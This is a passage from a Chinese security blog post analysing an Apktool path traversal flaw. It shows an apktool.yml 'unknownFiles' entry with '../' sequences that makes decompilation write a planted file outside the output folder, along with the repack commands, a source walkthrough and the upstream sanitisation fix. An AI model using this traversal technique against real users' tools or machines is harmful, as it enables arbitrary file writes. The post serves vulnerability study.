LOGGER.warning(&quot;JAXP 1.5 Support is required to validate XML&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    DocumentBuilder docBuilder = docFactory.newDocumentBuilder();</span><br><span class="line">    // Not using the parse(File) method on purpose, so that we can control when</span><br><span class="line">    // to close it. Somehow parse(File) does not seem to close the file in all cases.</span><br><span class="line">    FileInputStream inputStream = new FileInputStream(file);</span><br><span class="line">    try &#123;</span><br><span class="line">    	return docBuilder.parse(inputStream);</span><br><span class="line">    &#125; finally &#123;</span><br><span class="line">    	inputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="0x02-路径穿越漏洞"><a href="#0x02-路径穿越漏洞" class="headerlink" title="0x02 路径穿越漏洞"></a>0x02 路径穿越漏洞</h2><p>原理：Apktool在解析apktool.yml时，因为没有对“../“字符串过滤，导致漏洞发生</p>
+<p>利用过程：</p>
+<p>还是用刚才那个apk，依旧使用apktool进行反编译：<br>​    </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mask@mask-virtual-machine:~/AndroidTraveral$ java -jar apktool_2.2.2.jar d app-release.apk -o demo</span><br><span class="line">I: Using Apktool 2.2.2 on app-release.apk</span><br><span class="line">I: Loading resource table...</span><br><span class="line">I: Decoding AndroidManifest.xml with resources...</span><br><span class="line">I: Loading resource table from file: /home/mask/.local/share/apktool/framework/1.apk</span><br><span class="line">I: Regular manifest package...</span><br><span class="line">I: Decoding file-resources...</span><br><span class="line">I: Decoding values */* XMLs...</span><br><span class="line">I: Baksmaling classes.dex...</span><br><span class="line">I: Copying assets and libs...</span><br><span class="line">I: Copying unknown files...</span><br><span class="line">I: Copying original files...</span><br></pre></td></tr></table></figure>
+<p>​<br>编辑apktool.yml</p>
+<p>原文件：<br>​    </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">!!brut.androlib.meta.MetaInfo</span><br><span class="line">apkFileName: app-release.apk</span><br><span class="line">compressionType: false</span><br><span class="line">doNotCompress:</span><br><span class="line">- arsc</span><br><span class="line">isFrameworkApk: false</span><br><span class="line">packageInfo:</span><br><span class="line">  forcedPackageId: &apos;127&apos;</span><br><span class="line">  renameManifestPackage: null</span><br><span class="line">sdkInfo:</span><br><span class="line">  minSdkVersion: &apos;19&apos;</span><br><span class="line">  targetSdkVersion: &apos;26&apos;</span><br><span class="line">sharedLibrary: false</span><br><span class="line">unknownFiles: &#123;&#125;</span><br><span class="line">usesFramework:</span><br><span class="line">  ids:</span><br><span class="line">  - 1</span><br><span class="line">  tag: null</span><br><span class="line">version: 2.2.2</span><br><span class="line">versionInfo:</span><br><span class="line">  versionCode: &apos;1&apos;</span><br><span class="line">  versionName: &apos;1.0&apos;</span><br></pre></td></tr></table></figure>
+<p>对unknownFiles的值进行修改：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">unknownFiles: </span><br><span class="line">  Demo: &apos;8&apos;</span><br><span class="line">  ../../../../../../../../home/mask/AndroidTraveral/Shell: &apos;8&apos;</span><br></pre></td></tr></table></figure>
+<p>（Shell路径自行修改）</p>
+<p>因为apk太简单，反编译后没有生成unknown文件夹，那么我们手动创建一个，并且添加一个Demo文件（unknown文件夹不能为空，否则后面再次反编译的时候，不会释放Shell文件）</p>
+<ol>
+<li>在反编译文件夹下新建一个unknown文件夹，并且创建一个Demo文件（空白即可）</li>
+<li>按照刚才Shell路径，在此路径下添加一个Shell文件</li>
+</ol>
+<img src="/2018/03/17/apktool漏洞利用分析/3.png">
+<p>然后进行重打包：<br>​    </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mask@mask-virtual-machine:~/AndroidTraveral$ java -jar apktool_2.2.2.jar b demo/ -o demo.apk</span><br><span class="line">I: Using Apktool 2.2.2</span><br><span class="line">I: Checking whether sources has changed...</span><br><span class="line">I: Checking whether resources has changed...</span><br><span class="line">I: Building apk file...</span><br><span class="line">I: Copying unknown files/dir...</span><br></pre></td></tr></table></figure>
+<p>然后我们将之前创建的Shell删除，再次使用apktool反编译：<br>​    </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mask@mask-virtual-machine:~/AndroidTraveral$ java -jar apktool_2.2.2.jar d demo.apk -o poc</span><br><span class="line">I: Using Apktool 2.2.2 on demo.apk</span><br><span class="line">I: Loading resource table...</span><br><span class="line">I: Decoding AndroidManifest.xml with resources...</span><br><span class="line">I: Loading resource table from file: /home/mask/.local/share/apktool/framework/1.apk</span><br><span class="line">I: Regular manifest package...</span><br><span class="line">I: Decoding file-resources...</span><br><span class="line">I: Decoding values */* XMLs...</span><br><span class="line">I: Baksmaling classes.dex...</span><br><span class="line">I: Copying assets and libs...</span><br><span class="line">I: Copying unknown files...</span><br><span class="line">I: Copying original files...</span><br></pre></td></tr></table></figure>
+<p>那么可以看到，文件确实释放了</p>
+<img src="/2018/03/17/apktool漏洞利用分析/4.png">
+<p>源码分析：</p>
+<p>反编译时</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">this.mAndrolib.decodeUnknownFiles(this.mApkFile, outDir, this.mResTable);</span><br></pre></td></tr></table></figure>
+<p>跟进查看：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">public void decodeUnknownFiles(final ExtFile apkFile, final File outDir, final ResTable resTable) throws AndrolibException &#123;</span><br><span class="line">    Androlib.LOGGER.info(&quot;Copying unknown files...&quot;);</span><br><span class="line">    final File unknownOut = new File(outDir, &quot;unknown&quot;);</span><br><span class="line">    try &#123;</span><br><span class="line">        final Directory unk = apkFile.getDirectory();</span><br><span class="line">        final Set&lt;String&gt; files = unk.getFiles(true);</span><br><span class="line">        for (final String file : files) &#123;</span><br><span class="line">            if (!this.isAPKFileNames(file) &amp;&amp; !file.endsWith(&quot;.dex&quot;)) &#123;</span><br><span class="line">                unk.copyToDir(unknownOut, file);</span><br><span class="line">                this.mResUnknownFiles.addUnknownFileInfo(file, String.valueOf(unk.getCompressionLevel(file)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    catch (DirectoryException ex) &#123;</span><br><span class="line">        throw new AndrolibException(ex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>再来看下重打包的时候：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// we must go after the Apk is built, and copy the files in via Zip</span><br><span class="line">    // this is because Aapt won&apos;t add files it doesn&apos;t know (ex unknown files)</span><br><span class="line">    buildUnknownFiles(appDir, outFile, meta);</span><br></pre></td></tr></table></figure>
+<p>跟进：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">public void buildUnknownFiles(File appDir, File outFile, MetaInfo meta)</span><br><span class="line">        throws AndrolibException &#123;</span><br><span class="line">    if (meta.unknownFiles != null) &#123;</span><br><span class="line">        LOGGER.info(&quot;Copying unknown files/dir...&quot;);</span><br><span class="line"></span><br><span class="line">        Map&lt;String, String&gt; files = meta.unknownFiles;</span><br><span class="line">        File tempFile = new File(outFile.getParent(), outFile.getName() + &quot;.apktool_temp&quot;);</span><br><span class="line">        boolean renamed = outFile.renameTo(tempFile);</span><br><span class="line">        if(!renamed) &#123;</span><br><span class="line">            throw new AndrolibException(&quot;Unable to rename temporary file&quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        try (</span><br><span class="line">                ZipFile inputFile = new ZipFile(tempFile);</span><br><span class="line">                ZipOutputStream actualOutput = new ZipOutputStream(new FileOutputStream(outFile))</span><br><span class="line">        ) &#123;</span><br><span class="line">            copyExistingFiles(inputFile, actualOutput);</span><br><span class="line">            copyUnknownFiles(appDir, actualOutput, files);</span><br><span class="line">        &#125; catch (IOException | BrutException ex) &#123;</span><br><span class="line">            throw new AndrolibException(ex);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // Remove our temporary file.</span><br><span class="line">        tempFile.delete();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这一句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copyUnknownFiles(appDir, actualOutput, files);</span><br></pre></td></tr></table></figure>
+<p>然后跟进：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">private void copyUnknownFiles(final File appDir, final ZipOutputStream outputFile, final Map&lt;String, String&gt; files) throws IOException &#123;</span><br><span class="line">    final File unknownFileDir = new File(appDir, &quot;unknown&quot;);</span><br><span class="line">    for (final Map.Entry&lt;String, String&gt; unknownFileInfo : files.entrySet()) &#123;</span><br><span class="line">        final File inputFile = new File(unknownFileDir, unknownFileInfo.getKey());</span><br><span class="line">        if (inputFile.isDirectory()) &#123;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;</span><br><span class="line">        final ZipEntry newEntry = new ZipEntry(unknownFileInfo.getKey());</span><br><span class="line">        final int method = Integer.parseInt(unknownFileInfo.getValue());</span><br><span class="line">        Androlib.LOGGER.fine(String.format(&quot;Copying unknown file %s with method %d&quot;, unknownFileInfo.getKey(), method));</span><br><span class="line">        if (method == 0) &#123;</span><br><span class="line">            newEntry.setMethod(0);</span><br><span class="line">            newEntry.setSize(inputFile.length());</span><br><span class="line">            newEntry.setCompressedSize(-1L);</span><br><span class="line">            final BufferedInputStream unknownFile = new BufferedInputStream(new FileInputStream(inputFile));</span><br><span class="line">            final CRC32 crc = BrutIO.calculateCrc(unknownFile);</span><br><span class="line">            newEntry.setCrc(crc.getValue());</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            newEntry.setMethod(8);</span><br><span class="line">        &#125;</span><br><span class="line">        outputFile.putNextEntry(newEntry);</span><br><span class="line">        BrutIO.copy(inputFile, outputFile);</span><br><span class="line">        outputFile.closeEntry();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到这里貌似并没有作啥路径的检测，那么就会导致可能导致存在非法路径，重打包后再解析就会触发漏洞</p>
+<p>来看看作者更新后，左边为更新后，右边为原文件</p>
+<img src="/2018/03/17/apktool漏洞利用分析/5.png">
+<p>从函数名来看是进行检测，跟进这个函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">public static String sanitizeUnknownFile(final File directory, final String entry) throws IOException, BrutException &#123;</span><br><span class="line">    if (entry.length() == 0) &#123;</span><br><span class="line">        throw new InvalidUnknownFileException(&quot;Invalid Unknown File - &quot; + entry);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (new File(entry).isAbsolute()) &#123;</span><br><span class="line">        throw new RootUnknownFileException(&quot;Absolute Unknown Files is not allowed - &quot; + entry);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    final String canonicalDirPath = directory.getCanonicalPath() + File.separator;</span><br><span class="line">    final String canonicalEntryPath = new File(directory, entry).getCanonicalPath();</span><br><span class="line"></span><br><span class="line">    if (!canonicalEntryPath.startsWith(canonicalDirPath)) &#123;</span><br><span class="line">        throw new TraversalUnknownFileException(&quot;Directory Traversal is not allowed - &quot; + entry);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // https://stackoverflow.com/q/2375903/455008</span><br><span class="line">    return canonicalEntryPath.substring(canonicalDirPath.length());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>那么可以看到这里的报错提示就是绝对路径下的文件不允许，路径穿越不允许:)</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Android/" rel="tag"># Android</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/03/17/手脱早期Ali壳/" rel="next" title="手脱早期Ali壳">
+                <i class="fa fa-chevron-left"></i> 手脱早期Ali壳
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/03/17/Dalvik加载dex/" rel="prev" title="Dalvik加载dex">
+                Dalvik加载dex <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Mask</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">16</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-分析环境"><span class="nav-number">1.</span> <span class="nav-text">0x00 分析环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-XXE漏洞利用分析"><span class="nav-number">2.</span> <span class="nav-text">0x01 XXE漏洞利用分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-路径穿越漏洞"><span class="nav-number">3.</span> <span class="nav-text">0x02 路径穿越漏洞</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Mask</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
